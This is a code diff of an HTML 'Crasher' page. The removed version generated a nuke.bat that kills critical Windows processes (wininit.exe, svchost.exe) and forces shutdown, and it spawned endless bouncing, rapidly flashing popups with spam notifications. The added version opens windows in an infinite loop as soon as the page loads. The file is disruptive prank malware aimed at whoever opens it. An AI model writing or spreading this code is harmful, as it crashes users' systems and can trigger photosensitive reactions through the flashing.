@@ -1,60 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SYSTEM_CORE_REPLICATOR</title>
-    <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #f00; padding: 40px; text-align: center; box-shadow: 0 0 20px #f00; }
-        button { padding: 20px; background: #f00; color: #fff; border: none; font-weight: bold; cursor: pointer; margin: 10px; }
-    </style>
+    <title>Crasher</title>
 </head>
 <body>
-    <div class="box">
-        <h1>VM_DEATH_PROTOCOL</h1>
-        <button onclick="downloadBat()">1. CREATE BAT</button>
-        <button onclick="ignite()">2. EXECUTE REPLICATION</button>
-    </div>
-
     <script>
-        // 1. THIS CREATES THE REAL NUKE.BAT AUTOMATICALLY
-        function downloadBat() {
-            const batContent = `@echo off\ntitle KILL_SYSTEM\ntaskkill /f /im wininit.exe\ntaskkill /f /im svchost.exe\nshutdown /s /f /t 0`;
-            const blob = new Blob([batContent], { type: 'text/plain' });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = 'nuke.bat';
-            link.click();
-        }
-
-        // 2. THIS SPAWNS THE BOUNCING WINDOWS (NO EXTERNAL FILE NEEDED)
-        function ignite() {
-            setInterval(() => {
-                const w = 350, h = 350;
-                const x = Math.random() * (screen.width - w);
-                const y = Math.random() * (screen.height - h);
-                const win = window.open("", "_blank", `width=${w},height=${h},left=${x},top=${y}`);
-                
-                if (win) {
-                    win.document.write(`
-                        <body style="background:#000; overflow:hidden; animation: flash 0.02s infinite;">
-                            <style>@keyframes flash { 0%{background:#fff} 50%{background:#000} }</style>
-                            <script>
-                                let x=${x}, y=${y}, dx=30, dy=30;
-                                setInterval(() => {
-                                    x+=dx; y+=dy;
-                                    if(x+350 > screen.width || x<0) dx=-dx;
-                                    if(y+350 > screen.height || y<0) dy=-dy;
-                                    window.moveTo(x,y);
-                                }, 10);
-                                Notification.requestPermission().then(p => {
-                                    if(p==='granted') setInterval(() => { new Notification("FATAL", {body:"SYSTEM_LOST", silent:true}) }, 150);
-                                });
-                            <\/script>
-                        </body>
-                    `);
-                }
-            }, 200);
-        }
+        window.onload = function() {
+            // Aggressive loop to spawn the notification payload windows continuously
+            while (true) {
+                window.open('notification.html', '_blank', 'width=400,height=300');
+            }
+        };
     </script>
 </body>
 </html>
